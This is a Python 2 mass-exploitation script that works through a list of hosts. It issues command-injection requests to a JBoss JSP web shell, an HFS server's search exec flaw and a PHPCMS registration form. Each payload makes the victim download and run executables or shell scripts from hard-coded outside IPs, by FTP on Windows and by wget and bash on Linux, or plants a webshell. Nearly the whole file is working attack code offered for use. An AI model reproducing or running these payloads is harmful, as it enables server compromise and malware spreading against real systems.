#coding:utf-8
#author:IversOn5
#In order to exploit jboss.
""" python send_muma.py file.txt 50"""

import  requests
from random import randint
import re
import threadpool
import sys
import urllib2
from urllib import urlencode
from os import  path
from sys import exit

filepath= sys.argv[1]#"i:\Users\Administrator\Desktop\\test_boos.txt"
f= open(filepath,'r')
urls = f.readlines()
f.close()

def get_random_user_agent():
    user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
                   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
                   "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
                   "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
                   "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]
    return user_agents[randint(0, len(user_agents) - 1)]

def get_headers():
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent()}
    return headers


send_type =sys.argv[3]

def pwdd(host):
    pwd_payload='/jexws4/jexws4.jsp?ppp=pwd'
    payload="http://"+host+pwd_payload
    #print payload
    reqx=urllib2.Request(payload,headers=get_headers())
    try:
        html=urllib2.urlopen(reqx,timeout=30).read()
        indexx=html.find("/")

        if len(html[indexx:])>3:
            return True
        else:
            return False
    except Exception,e:
        pass
        return "error"

def win_send(host):
    #win_payload ='/jexws4/jexws4.jsp?ppp=echo%20echo%20open%20119.29.173.112%2021^>ftp.txt>x.bat%26echo%20echo%20test^>^>ftp.txt>>x.bat%26echo%20echo%20test^>^>ftp.txt>>x.bat%26echo%20echo%20binary^>^>ftp.txt>>x.bat%26echo%20echo%20get%20winsxs.exe^>^>ftp.txt>>x.bat%26echo%20echo%20bye^>^>ftp.txt>>x.bat%26echo%20ftp%20-s:ftp.txt^%26^%26winsxs.exe>>x.bat%26x.bat'
    win_payload_tmp='/jexws4/jexws4.jsp?ppp=echo%20open%20echo%20open%20119.29.173.112%2021^>ftp.txt>x.bat%26echo%20echo%20test^>^>ftp.txt>>x.bat%26echo%20echo%20test^>^>ftp.txt>>x.bat%26echo%20echo%20binary^>^>ftp.txt>>x.bat%26echo%20echo%20get%20gpu.bat^>^>ftp.txt>>x.bat%26echo%20echo%20bye^>^>ftp.txt>>x.bat%26echo%20ftp%20-s:ftp.txt^%26^%26gpu.bat>>x.bat%26x.bat'
    win='/jexws4/jexws4.jsp?ppp=echo%20open%20119.29.173.112%2021>ftp.txt%26echo%20123>>ftp.txt%26echo%20123>>ftp.txt%26echo%20binary>>ftp.txt%26echo%20get%20winsxs.exe>>ftp.txt%26echo%20bye>>ftp.txt%26%26ftp%20-s:ftp.txt%26%26winsxs.exe'
    vul = 'http://' + host +win
    req = urllib2.Request(vul,headers=get_headers())
    try:
        html = urllib2.urlopen(req,timeout=30)
    except Exception,e:
        print e.message

def lin_sed(host):
    pwddd=pwdd(host)
    #lin_payload ='/jexws4/jexws4.jsp?ppp=wget%20-P%20/tmp/%20http://69.165.65.252/guard_v1.sh%26%26chmod%20777%20/tmp/guard_v1.sh%26%26bash%20/tmp/guard_v1.sh'
    lin_payload='/jexws4/jexws4.jsp?ppp=wget%20-P%20/tmp%20http://69.165.65.252/selectv6.sh%26%26chmod%20777%20/tmp/selectv6.sh%26%26bash%20/tmp/selectv6.sh'
    lin_payload_pwd='/jexws4/jexws4.jsp?ppp=wget%20http://69.165.65.252/selectv6.sh%26%26bash%20selectv6.sh'
    req_pwd=urllib2.Request("http://"+host+lin_payload_pwd,headers=get_headers())
    req = urllib2.Request('http://' + host +lin_payload,headers=get_headers())
    try:
        if pwddd==True:
            html = urllib2.urlopen(req_pwd,timeout=30)
            print "pwd one--"
        elif pwddd==False:
            text = urllib2.urlopen(req,timeout=30)
            print "tmp one"
        elif pwddd=="error":
            print "error one"

    except Exception,e:
        print e.message

# def lin_root(host):
#     lin_payload_root ='/jexws4/jexws4.jsp?ppp=wget%20-P%20/etc/%20http://69.165.65.252/root.sh%26%26chmod%20777%20/etc/root.sh&&bash%20/etc/root.sh'
#     req = urllib2.Request('http://' + host +lin_payload_root,headers=get_headers())
#     try:
#         html = urllib2.urlopen(req,timeout=30)
#     except Exception,e:
#         print e.message


def send_hfs(host):
    payload1 = "/?search==%00{.exec|echo%20open%20119.29.173.112%2021>ftp.txt%26echo%20123>>ftp.txt%26echo%20123>>ftp.txt%26echo%20binary>>ftp.txt%26echo%20get%20systemin.exe>>ftp.txt%26echo%20bye>>ftp.txt%26%26ftp%20-s:ftp.txt%26%26systemin.exe.}"
    payload2 = "/search=%00{.exec|echo%20open%20119.29.173.112%20212>ftp.txt%26echo%20123>>ftp.txt%26echo%20123>>ftp.txt%26echo%20binary>>ftp.txt%26echo%20get%20systemin.exe>>ftp.txt%26echo%20bye>>ftp.txt%26%26ftp%20-s:ftp.txt%26%26systemin.exe.}"
    try:
        url1 = "http://"+host+payload1
        print url1
        url2  ="http://"+host +payload2
        r1 = requests.get(url1,headers=get_headers(),timeout=20)
        r2 = requests.get(url2,headers=get_headers(),timeout=20)
    except Exception,e:
        print e.message
        pass

def win_sendx(host):
    #win_payload ='/jexws4/jexws4.jsp?ppp=echo%20echo%20open%20119.29.173.112%2021^>ftp.txt>x.bat%26echo%20echo%20test^>^>ftp.txt>>x.bat%26echo%20echo%20test^>^>ftp.txt>>x.bat%26echo%20echo%20binary^>^>ftp.txt>>x.bat%26echo%20echo%20get%20winsxs.exe^>^>ftp.txt>>x.bat%26echo%20echo%20bye^>^>ftp.txt>>x.bat%26echo%20ftp%20-s:ftp.txt^%26^%26winsxs.exe>>x.bat%26x.bat'
    win_payload_tmp='/jexws4/jexws4.jsp?ppp=echo%20open%20echo%20open%20119.29.173.112%2021^>ftp.txt>x.bat%26echo%20echo%20test^>^>ftp.txt>>x.bat%26echo%20echo%20test^>^>ftp.txt>>x.bat%26echo%20echo%20binary^>^>ftp.txt>>x.bat%26echo%20echo%20get%20gpu.bat^>^>ftp.txt>>x.bat%26echo%20echo%20bye^>^>ftp.txt>>x.bat%26echo%20ftp%20-s:ftp.txt^%26^%26gpu.bat>>x.bat%26x.bat'
    win='/jexws4/jexws4.jsp?ppp=echo%20open%20119.29.173.112%2021>ftp.txt%26echo%20123>>ftp.txt%26echo%20123>>ftp.txt%26echo%20binary>>ftp.txt%26echo%20get%20sysin.exe>>ftp.txt%26echo%20bye>>ftp.txt%26%26ftp%20-s:ftp.txt%26%26sysin.exe'
    vul = 'http://' + host +win
    req = urllib2.Request(vul,headers=get_headers())
    try:
        html = urllib2.urlopen(req,timeout=30)
    except Exception,e:
        print e.message


def phpcms(host):
    payload='siteid=1&modelid=11&username=nxxewbie&password=nxewxbie&email=nxewxbie@qq.com&info%5Bcontent%5D=%3Cimg%20src=http://shhdmqz.com/newbie.txt?.php#.jpg>&dosubmit=1&protocol='
    url="http://"+host+"/index.php?m=member&c=index&a=register&siteid=1"
    #print 'testing' +url
    try:
        r = requests.post(url,data=payload,headers=get_headers()).text
        pattern = re.compile("img src=(.*?)&gt")
        webshell =re.findall(pattern,r)
        print webshell
        if webshell:
            with open('phpcms_webshell','r') as a:
                a.write(webshell+'\n')
                print 'success one - -'
    except Exception,e:
        pass

def main(host):
	if send_type == "win":
		win_send(host)
	elif send_type == "lin":
		lin_sed(host)
	elif send_type=="phpcms":
	 	phpcms(host)
		



if __name__=="__main__":
    import time

    pool = threadpool.ThreadPool(int(sys.argv[2]))
    start = time.time()
    xx = []
    for i in urls:
        # print i.strip()
        xx.append(i.strip())

    requestsx = threadpool.makeRequests(main, xx)
    [pool.putRequest(req) for req in requestsx]
    pool.wait()

    print 'Need ' + str(time.time() - start)
	
